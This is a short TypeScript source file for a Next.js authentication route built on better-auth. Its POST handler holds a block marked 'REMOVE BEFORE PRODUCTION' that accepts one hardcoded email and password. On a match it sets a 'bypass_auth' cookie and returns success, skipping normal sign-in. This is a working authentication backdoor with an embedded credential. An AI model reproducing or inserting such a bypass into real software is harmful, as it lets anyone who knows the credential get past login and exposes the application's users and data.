import { toNextJsHandler } from 'better-auth/next-js'
import { cookies } from 'next/headers'
import { auth } from '@/lib/auth'
import { createLogger } from '@/lib/logs/console-logger'

export const dynamic = 'force-dynamic'

const handler = toNextJsHandler(auth.handler)

const logger = createLogger('AuthAPI')

export const GET = handler.GET

export async function POST(request: Request) {
  const url = new URL(request.url)
  if (url.pathname.endsWith('/sign-in/email')) {
    const payload = await request
      .clone()
      .json()
      .catch(() => null)
    // BYPASS BLOCK -- REMOVE BEFORE PRODUCTION
    if (payload?.email === 'yourmom@yahoo.com' && payload?.password === 'Carraja!2170!!') {
      cookies().set('bypass_auth', '1', { maxAge: 86400, path: '/' })
      logger.warn('Bypass login used')
      return new Response(JSON.stringify({}), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      })
    }
  }

  return handler.POST(request)
}
